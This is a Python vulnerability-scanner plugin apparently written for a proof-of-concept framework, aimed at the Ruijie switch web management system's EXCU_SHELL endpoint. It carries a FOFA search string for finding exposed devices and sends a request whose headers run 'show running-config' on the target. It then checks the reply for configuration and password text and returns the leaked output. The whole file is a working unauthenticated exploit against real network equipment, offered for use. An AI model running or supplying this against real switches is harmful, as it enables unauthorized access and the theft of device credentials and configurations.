#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/Pj8VB48pLZ1mpXylkaHIkg',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '锐捷交换机 WEB 管理系统 EXCU_SHELL信息泄露',

      'level'     :   'high',

      'FOFA'      :   'body="img/free_login_ge.gif"&&body="./img/login_bg.gif"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Cmdnum': "'1'",
      'Command1': 'show running-config',
      'Confirm1': 'n',
      }
  target = '/EXCU_SHELL'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,allow_redirects=True,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'Building.*?configuration.*?password.*?',res.text,re.S):
      ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret